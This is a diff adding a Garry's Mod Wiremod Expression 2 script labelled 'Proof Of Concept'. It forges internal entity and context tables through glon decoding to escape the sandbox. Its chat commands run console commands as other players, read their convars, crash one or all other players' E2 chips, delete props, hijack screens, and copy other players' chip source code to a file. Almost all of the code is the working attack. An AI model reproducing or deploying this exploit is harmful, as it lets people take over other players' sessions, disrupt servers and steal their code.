@@ -1,0 +1,534 @@
+@name Proof Of Concept
+@inputs
+@outputs 
+@persist XWL:wirelink
+@trigger 
+
+runOnChat(1)
+
+Chars = format("%c%c%c%c%c%c%c%c%c%c%c", 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11)
+S1 = Chars[1]
+S2 = Chars[2]
+S3 = Chars[3]
+S6 = Chars[6]
+S7 = Chars[7]
+S10 = Chars[10]
+S11 = Chars[11]
+EmptyTable = S2 + S1
+
+if (first() | duped()) {
+    setName("E2 test")
+#ifdef createE2(string, vector)
+    setName("Anti-Nebual Defenses")
+#endif
+    gSetGroup("E2POC")
+    gShare(1)
+    dsSetScope(2)
+    
+    # Method 1 of getting an entity as a table
+    EntityString = format("%c%d%c", 10, entity():id(), 1)
+    gSetStr("This", EntityString)
+    EntityTable = glonDecodeTable(EntityString)
+    GT = gTable("E2POC", 1)
+    GT["Table", table] = EntityTable
+    GT["Wiped", table] = table()
+    GT["WipeQueue", array] = array()
+
+#ifdef array:pushGeneric(generic)
+    EntityGeneric = S2
+        EntityGeneric += S7 + "nbuffer" + S1
+            EntityGeneric += S7 + "buffer" + S1
+        EntityGeneric += S7 + "n_buffer" + S1
+            EntityGeneric += S7 + "_buffer" + S1
+        EntityGeneric += S7 + "noriginal" + S1
+            EntityGeneric += S7 + "original" + S1
+        EntityGeneric += S7 + "n_original" + S1
+            EntityGeneric += S7 + "_original" + S1
+        EntityGeneric += S7 + "ggeneric" + S1
+            EntityGeneric += S2
+                EntityGeneric += S7 + "realType" + S1
+                    EntityGeneric += S7 + "t" + S1
+                EntityGeneric += S7 + "data" + S1
+                    EntityGeneric += S10
+                        EntityGeneric += "%entid%"
+                    EntityGeneric += S1
+            EntityGeneric += S1
+        EntityGeneric += S7 + "ggtable" + S1
+            EntityGeneric += S2
+                EntityGeneric += S7 + "realType" + S1
+                    EntityGeneric += S7 + "t" + S1
+                EntityGeneric += S7 + "data" + S1
+                    EntityGeneric += S10
+                        EntityGeneric += "%entid%"
+                    EntityGeneric += S1
+            EntityGeneric += S1
+        EntityGeneric += S7 + "ggarray" + S1
+            EntityGeneric += S2
+                EntityGeneric += S7 + "realType" + S1
+                    EntityGeneric += S7 + "r" + S1
+                EntityGeneric += S7 + "data" + S1
+                    EntityGeneric += S10
+                        EntityGeneric += "%entid%"
+                    EntityGeneric += S1
+            EntityGeneric += S1
+    EntityGeneric += S1
+    
+    Table = glonDecodeTable(EntityGeneric:replace("%entid%", toString(entity():id())))
+    Generic = Table:generic("gtable")
+    EntityTable = (Generic[table])
+    GT["Table", table] = EntityTable
+    gSetStr("EntityGeneric", EntityGeneric)
+#endif
+    gSetEnt("Owner", owner())
+    
+    ContextString = ""
+    OriginalContextString = ""
+    
+    ContextString += S2
+        ContextString += S7 + "ccontext" + S1
+            ContextString += S2
+                # ContextString += S7 + "dermacrap" + S1
+                #     ContextString += EmptyTable
+                ContextString += S7 + "vclk" + S1
+                    ContextString += EmptyTable
+                ContextString += S7 + "prfcount" + S1
+                    ContextString += S6 + "0" + S1
+                ContextString += S7 + "prfbench" + S1
+                    ContextString += S6 + "0" + S1
+                ContextString += S7 + "triggercache" + S1
+                    ContextString += EmptyTable
+                ContextString += S7 + "data" + S1
+                    ContextString += S2
+                        ContextString += S7 + "currentsound" + S1
+                            ContextString += EmptyTable
+                        ContextString += S7 + "datasignal" + S1
+                            ContextString += S2
+                                ContextString += S7 + "scope" + S1
+                                    ContextString += S6 + "2" + S1
+                            ContextString += S1
+                        ContextString += S7 + "EGP" + S1
+                            ContextString += S2
+                                ContextString += S7 + "UpdatesNeeded" + S1
+                                    ContextString += EmptyTable
+                            ContextString += S1
+                        ContextString += S7 + "find" + S1
+                            ContextString += S2
+                                ContextString += S7 + "bl_entity" + S1
+                                    ContextString += EmptyTable
+                                ContextString += S7 + "bl_owner" + S1
+                                    ContextString += EmptyTable
+                                ContextString += S7 + "bl_model" + S1
+                                    ContextString += EmptyTable
+                                ContextString += S7 + "bl_class" + S1
+                                    ContextString += EmptyTable
+                                ContextString += S7 + "wl_entity" + S1
+                                    ContextString += EmptyTable
+                                ContextString += S7 + "wl_owner" + S1
+                                    ContextString += EmptyTable
+                                ContextString += S7 + "wl_model" + S1
+                                    ContextString += EmptyTable
+                                ContextString += S7 + "wl_class" + S1
+                                    ContextString += EmptyTable
+                            ContextString += S1
+                        ContextString += S7 + "findcount" + S1
+                            ContextString += S6 + "1e1000" + S1
+                        ContextString += S7 + "findnext" + S1
+                            ContextString += S6 + "0" + S1
+                        ContextString += S7 + "gvars" + S1
+                            ContextString += S2
+                                ContextString += S7 + "group" + S1
+                                    ContextString += S7 + "E2POC" + S1
+                                ContextString += S7 + "shared" + S1
+                                    ContextString += S6 + "1" + S1
+                            ContextString += S1
+                        ContextString += S7 + "lookup" + S1
+                            ContextString += EmptyTable
+                        ContextString += S7 + "timer" + S1
+                            ContextString += S2
+                                ContextString += S7 + "timerid" + S1
+                                    ContextString += S6 + "0" + S1
+                                ContextString += S7 + "timers" + S1
+                                    ContextString += "%timers%"
+                            ContextString += S1
+                        ContextString += S7 + "holos" + S1
+                            ContextString += "%holos%"
+                    ContextString += S1
+                ContextString += S7 + "prf" + S1
+                    ContextString += S6 + "%ops%" + S1
+                ContextString += S7 + "player" + S1
+                    ContextString += S10 + "%owner%" + S1
+                ContextString += S7 + "entity" + S1
+                    ContextString += S10 + "%entid%" + S1
+                ContextString += S7 + "vars" + S1
+                    ContextString += "%vars%"
+        ContextString += S1
+    ContextString += S1
+    # %holos%, %ops%, %owner%, %entid%, %vars%
+    
+    OriginalContextString = ContextString:replace("%ops%", "0")
+    OriginalContextString = OriginalContextString:replace("%holos%", EmptyTable)
+    OriginalContextString = OriginalContextString:replace("%owner%", toString(owner():id()))
+    OriginalContextString = OriginalContextString:replace("%entid%", toString(entity():id()))
+    OriginalContextString = OriginalContextString:replace("%vars%", EmptyTable)
+    OriginalContextString = OriginalContextString:replace("%timers%", EmptyTable)
+    gSetStr("OriginalContext", OriginalContextString)
+    gSetStr("ContextTemplate", ContextString)
+    gSetStr("ContextEmptyTable", EmptyTable)
+    
+    gSetEnt("ToWipe", entity())
+}
+
+if ((dsClk() | gGetNum("ExpectingDS")) &
+    !gGetNum("RestartingTimer")) {
+    RestoreState = 0
+    AnotherDS = 0
+    WirelinkTable = table()
+    if (XWL:entity()) {
+        Table = glonDecodeTable(gGetStr("EntityGeneric"):replace("%entid%", toString(XWL:entity():id())))
+        WirelinkTable = Table:generic("gtable")[table]
+    }
+    if (gGetStr("State") == "Executing") {
+        if (gGetStr("Command") == "cmd") {
+            concmd(gGetStr("Argument"))
+        } elseif (gGetStr("Command") == "cvar") {
+            gSetStr("ConVar", convar(gGetStr("Argument")))
+        } elseif (gGetStr("Command") == "print") {
+            print(gGetStr("Argument"))
+        } elseif (gGetStr("Command") == "hint") {
+            hint(gGetStr("Argument"), 10)
+        }
+        gSetStr("State", "Report")
+        RestoreState = 1
+        AnotherDS = 1
+        dsSendDirect("", entity(), "")
+    } elseif (gGetStr("State") == "Report") {
+        if (gGetStr("Command") == "cmd") {
+            print("Running \"" + gGetStr("Argument") + "\" on " + gGetStr("Target"))
+        } elseif (gGetStr("Command") == "cvar") {
+            print("ConVar " + gGetStr("Argument") + " was " + gGetStr("ConVar"))
+        } elseif (gGetStr("Command") == "print") {
+            print("Printing \"" + gGetStr("Argument") + "\"to " + gGetStr("Target"))
+        } elseif (gGetStr("Command") == "hint") {
+            print("Hinting \"" + gGetStr("Argument") + "\"to " + gGetStr("Target"))
+        }
+        gSetStr("State", "None")
+    } elseif (gGetStr("State") == "Wiping") {
+        stoptimer("original")
+        stoptimer("_original")
+        stoptimer("buffer")
+        stoptimer("_buffer")
+        RestoreState = 1
+        print("Wiping entity " + gGetEnt("ToWipe"):id() + ".")
+        gSetEnt("ToWipe", noentity())
+        gSetStr("State", "None")
+    } elseif (gGetStr("State") == "ConsoleWrite") {
+        One = glonDecodeTable(S2 + S7 + "ea" + S1 + S6 + "1" + S1 + S1)["a", entity]
+        print(One)
+        WirelinkTable["xtended", entity] = One
+        XWL[2041] = 1
+        print("Writing " + gGetStr("Argument"))
+        XWL:writeString(gGetStr("Argument"), 0, 0)
+        RestoreState = 1
+        gSetStr("State", "None")
+    } elseif (gGetStr("State") == "TextWrite") {
+        One = glonDecodeTable(S2 + S7 + "ea" + S1 + S6 + "1" + S1 + S1)["a", entity]
+        WirelinkTable["xtended", entity] = One
+        print("Writing " + gGetStr("Argument"))
+        XWL["String", string] = gGetStr("Argument")
+        XWL:setString("String", gGetStr("Argument"))
+        RestoreState = 1
+        gSetStr("State", "None")
+    } elseif (gGetStr("State") == "EGPWrite" |
+              gGetStr("State") == "EGPTextWrite") {
+#ifdef wirelink:egpClear()
+        One = glonDecodeTable(S2 + S7 + "ea" + S1 + S6 + "1" + S1 + S1)["a", entity]
+        WirelinkTable["xtended", entity] = One
+        if (gGetStr("State") == "EGPWrite") {
+            XWL:egpClear()
+            XWL:egpText(20, gGetStr("Argument"), vec2(0, 230))
+            XWL:egpFont(20, "lucida console", 500)
+        } else {
+            for (I = 1, 30) {
+                XWL:egpSetText(I, gGetStr("Argument"))
+            }
+        }
+#endif
+        RestoreState = 1
+        gSetStr("State", "None")
+    } elseif (gGetStr("State") == "Nuking") {
+        print("Nuking ", holoEntity(1))
+        holoDelete(1)
+        RestoreState = 1
+        gSetStr("State", "None")
+    }
+    
+    if (RestoreState) {
+        if (!AnotherDS) {
+            gSetNum("ClearExpectingDS", 1)
+        }
+        GT = gTable("E2POC", 1)
+        NewContext = glonDecodeTable(gGetStr("OriginalContext"))["context", complex]
+        EntityTable = GT["Table", table]
+        EntityTable["ontext", complex] = NewContext
+    } elseif (!AnotherDS) {
+        gSetNum("ClearExpectingDS", 1)
+    }
+} else {
+    gSetNum("RestartingTimer", 0)
+    stoptimer("interval")
+    # interval(100)
+}
+
+if (chatClk() & !dsClk() & !gGetNum("ExpectingDS")) {
+    if (lastSpoke() == gGetEnt("Owner")) {
+        LastSaid = lastSaid()
+        if (LastSaid:sub(1, 1) == "!") {
+            hideChat(1)
+            LastSaid = LastSaid:sub(2)
+            Parts = LastSaid:explode(" ")
+            Arguments = LastSaid:sub(Parts[1, string]:length() + 2)
+            Command = Parts[1, string]
+            if (Command == "boom") {
+            } elseif (Command == "console" | 
+                      Command == "egp" | 
+                      Command == "egptext" | 
+                      Command == "text") {
+                # Hijack a console screen
+                Target = gGetEnt("Owner"):aimEntity()
+                gSetEnt("Target", Target)
+                gSetStr("Argument", Arguments)
+                if (Target:type() == "gmod_wire_consolescreen" |
+                    Target:type() == "gmod_wire_egp" |
+                    Target:type() == "gmod_wire_textscreen") {
+                    ConsoleContext = gGetStr("ContextTemplate")
+                    ConsoleContext = ConsoleContext:replace("%ops%", "0")
+                    ConsoleContext = ConsoleContext:replace("%entid%", toString(entity():id()))
+                    ConsoleContext = ConsoleContext:replace("%owner%", toString(owner():id()))
+                    ConsoleContext = ConsoleContext:replace("%holos%", EmptyTable)
+                    ConsoleContext = ConsoleContext:replace("%vars%", S2 + S7 + "XWL" + S1 + S10 + toString(Target:id()) + S1 + S1)
+                    ConsoleContext = ConsoleContext:replace("%timers%", EmptyTable)
+                    GT = gTable("E2POC", 1)
+                    EntityTable = GT["Table", table]
+                    EntityTable["ontext", complex] = glonDecodeTable(ConsoleContext)["context", complex]
+                    if (Command == "console") {
+                        gSetStr("State", "ConsoleWrite")
+                    } elseif (Command == "egp") {
+                        gSetStr("State", "EGPWrite")
+                    } elseif (Command == "egptext") {
+                        gSetStr("State", "EGPTextWrite")
+                    } else {
+                        gSetStr("State", "TextWrite")
+                    }
+                    gSetNum("ExpectingDS", 1)
+                    dsSendDirect("", entity(), "")
+                } else {
+                    print("You are not looking at a console screen.")
+                }
+            } elseif (Command == "cmd" |
+                      Command == "cvar" |
+                      Command == "print" |
+                      Command == "hint") {
+                gSetStr("Command", Command)
+                Player = gGetEnt("Owner"):aimEntity()
+                if (Player:type() != "player") {
+                    Player = noentity()
+                }
+                if (!Player & Parts:count() > 2) {
+                    Player = findPlayerByName(Parts[2, string])
+                    Arguments = Arguments:sub(Parts[2, string]:length() + 2)
+                }
+                if (!Player) {
+                    print("No player found.")
+                } else {
+                    gSetStr("Target", Player:name())
+                    gSetStr("Argument", Arguments)
+                    PlayerContext = gGetStr("ContextTemplate")
+                    PlayerContext = PlayerContext:replace("%ops%", "0")
+                    PlayerContext = PlayerContext:replace("%entid%", toString(entity():id()))
+                    PlayerContext = PlayerContext:replace("%owner%", toString(Player:id()))
+                    PlayerContext = PlayerContext:replace("%holos%", EmptyTable)
+                    PlayerContext = PlayerContext:replace("%vars%", EmptyTable)
+                    PlayerContext = PlayerContext:replace("%timers%", EmptyTable)
+                    GT = gTable("E2POC", 1)
+                    EntityTable = GT["Table", table]
+                    EntityTable["ontext", complex] = glonDecodeTable(PlayerContext)["context", complex]
+                    
+                    # Now datasignal
+                    gSetStr("State", "Executing")
+                    gSetNum("ExpectingDS", 1)
+                    dsSendDirect("", entity(), "")
+                }
+            } elseif (Command == "nuke") {
+                Target = gGetEnt("Owner"):aimEntity()
+                if (Target:type() == "player") {
+                    Target = noentity()
+                }
+                if (!Target & Parts:count() > 1) {
+                    Target = entity(Parts[2, string]:toNumber())
+                }
+                if (!Target) {
+                    print("No target found.")
+                } else {
+                    gSetEnt("Target", Target)
+                    gSetStr("Argument", Arguments)
+                    PropContext = gGetStr("ContextTemplate")
+                    PropContext = PropContext:replace("%ops%", "0")
+                    PropContext = PropContext:replace("%entid%", toString(entity():id()))
+                    PropContext = PropContext:replace("%owner%", toString(owner():id()))
+                    PropContext = PropContext:replace("%vars%", EmptyTable)
+                    PropContext = PropContext:replace("%timers%", EmptyTable)
+                    HoloTable = S2
+                        HoloTable += S6 + "1" + S1
+                            HoloTable += S2
+                                HoloTable += S7 + "ent" + S1
+                                HoloTable += S10 + toString(Target:id()) + S1
+                            HoloTable += S1
+                    HoloTable += S1
+                    PropContext = PropContext:replace("%holos%", HoloTable)
+                    GT = gTable("E2POC", 1)
+                    EntityTable = GT["Table", table]
+                    EntityTable["ontext", complex] = glonDecodeTable(PropContext)["context", complex]
+                    
+                    # Now datasignal
+                    gSetStr("State", "Nuking")
+                    dsSendDirect("", entity(), "")
+                }
+            } elseif (Command == "crash" |
+                      Command == "quota") {
+                Target = gGetEnt("Owner"):aimEntity()
+                if (!Target & Parts:count() > 1) {
+                    Target = entity(Parts[2, string]:toNumber())
+                }
+                if (!Target) {
+                    print("No target found.")
+                } else {
+                    gSetStr("Command", Command)
+                    QuotaHitContext = gGetStr("ContextTemplate")
+                    QuotaHitContext = QuotaHitContext:replace("%ops%", "1e1000")
+                    QuotaHitContext = QuotaHitContext:replace("%entid%", toString(Target:id()))
+                    QuotaHitContext = QuotaHitContext:replace("%owner%", toString(Target:owner():id()))
+                    QuotaHitContext = QuotaHitContext:replace("%vars%", EmptyTable)
+                    QuotaHitContext = QuotaHitContext:replace("%holos%", EmptyTable)
+                    QuotaHitContext = QuotaHitContext:replace("%timers%", EmptyTable)
+                    
+                    EntityTable = glonDecodeTable(gGetStr("EntityGeneric"):replace("%entid%", toString(Target:id()))):generic("gtable")[table]
+                    gSetEnt("Target", Target)
+                    EntityTable["ontext", complex] = glonDecodeTable(QuotaHitContext)["context", complex]
+                    
+                    # The e2 is dead on the next execution.
+                    # Help it on its way.
+                    if (gGetStr("Command") == "crash") {
+                        dsSendDirect("Boom", gGetEnt("Target"), "")
+                    }
+                }
+            } elseif (Command == "crashall" |
+                      Command == "quotaall") {
+                gSetStr("Command", Command)
+                findByClass("gmod_wire_expression2")
+                R = findToArray()
+                QuotaHitContext = gGetStr("ContextTemplate")
+                QuotaHitContext = QuotaHitContext:replace("%ops%", "1e10000")
+                QuotaHitContext = QuotaHitContext:replace("%vars%", EmptyTable)
+                QuotaHitContext = QuotaHitContext:replace("%holos%", EmptyTable)
+                QuotaHitContext = QuotaHitContext:replace("%timers%", EmptyTable)
+                for (I = 1, R:count()) {
+                    Entity = R[I, entity]
+                    if (Entity != entity()) {
+                        EntityTable = glonDecodeTable(gGetStr("EntityGeneric"):replace("%entid%", toString(Entity:id()))):generic("gtable")[table]
+                        ThisQuotaHitContext = QuotaHitContext                        
+                        ThisQuotaHitContext = ThisQuotaHitContext:replace("%entid%", toString(Entity:id()))
+                        ThisQuotaHitContext = ThisQuotaHitContext:replace("%owner%", toString(Entity:owner():id()))
+                        
+                        EntityTable["ontext", complex] = glonDecodeTable(ThisQuotaHitContext)["context", complex]
+                        # The e2 is dead on the next execution.
+                        # Help it on its way.
+                        if (gGetStr("Command") == "crashall") {
+                            dsSendDirect("Boom", Entity, "")
+                        }
+                    }
+                }
+            } elseif (Command == "read") {
+                Target = gGetEnt("Owner"):aimEntity()
+                if (Parts:count() > 1) {
+                    Target = entity(Parts[2, string]:toNumber())
+                }
+                if (!Target) {
+                    print("No target found.")
+                } else {
+                    EntityArray = glonDecodeTable(gGetStr("EntityGeneric"):replace("%entid%", toString(Target:id()))):generic("garray")[array]
+                    Key = "original"
+                    KeyNumber = glonDecodeTable(S2 + S7 + "n" + Key + S1 + S7 + Key + S1 + S1)[Key, number]
+                    CodeLines = EntityArray[KeyNumber, string]:explode("\n")
+                    fileWrite(Target:owner():name() + "_" + Target:getName() + ".txt", EntityArray[KeyNumber, string])
+                    gSetStr("Code", EntityArray[KeyNumber, string])
+                }
+            } elseif (Command == "test") {
+                GT = gTable("E2POC", 1)
+                EntityTable = GT["Table", table]
+                print(EntityTable)
+            }
+        }
+    }
+}
+
+if (!gGetNum("ExpectingDS") &
+    !gGetNum("ClearExpectingDS") &
+    !dsClk()) {
+    GT = gTable("E2POC", 1)
+#ifdef createE2(string, vector)
+    if (findCanQuery()) {
+        findByClass("gmod_wire_expression2")
+        R = findToArray()
+        R:pushEntity(entity())
+        for (I = 1, R:count()) {
+            if (R[I, entity]:owner() == owner()) {
+                if (R[I, entity]:getColor() != vec(0, 255, 0) &
+                    R[I, entity]:getColor() != vec(255, 0, 0)) {
+                    if (GT["Wiped", table][toString(R[I, entity]:id()), entity] != R[I, entity]) {
+                        Table = GT["Wiped", table]
+                        Table[toString(R[I, entity]:id()), entity] = R[I, entity]
+                        Array = GT["WipeQueue", array]
+                        Array:pushEntity(R[I, entity])
+                    }
+                } else {
+                    if (GT["Wiped", table][toString(R[I, entity]:id()), entity] == R[I, entity]) {
+                        print("Marking entity " + R[I, entity]:id() + " as unwiped.")
+                        Table = GT["Wiped", table]
+                        Table[toString(R[I, entity]:id()), entity] = noentity()
+                    }
+                }
+            }
+        }
+    }
+#endif
+    Array = GT["WipeQueue", array]
+    if (Array:count()) {
+        Entity = Array:shiftEntity()
+        
+        Context = gGetStr("ContextTemplate")
+        Context = Context:replace("%ops%", "0")
+        Context = Context:replace("%entid%", toString(entity():id()))
+        Context = Context:replace("%owner%", toString(owner():id()))
+        Context = Context:replace("%vars%", EmptyTable)
+        Context = Context:replace("%holos%", EmptyTable)
+        Context = Context:replace("%timers%", S10 + Entity:id() + S1)
+        EntityTable = GT["Table", table]
+        EntityTable["ontext", complex] = glonDecodeTable(Context)["context", complex]
+        gSetEnt("ToWipe", Entity)
+        gSetNum("ExpectingDS", 1)
+        gSetStr("State", "Wiping")
+        print("Pushing an entity", dsClk())
+        dsSendDirect("", entity(), "")
+    }
+}
+
+if (gGetNum("ExpectingDS")) {
+    stoptimer("interval")
+}
+
+if (gGetNum("ClearExpectingDS")) {
+    gSetNum("ClearExpectingDS", 0)
+    gSetNum("ExpectingDS", 0)
+    gSetNum("RestartingTimer", 1)
+    dsSendDirect("", entity(), "")
+}
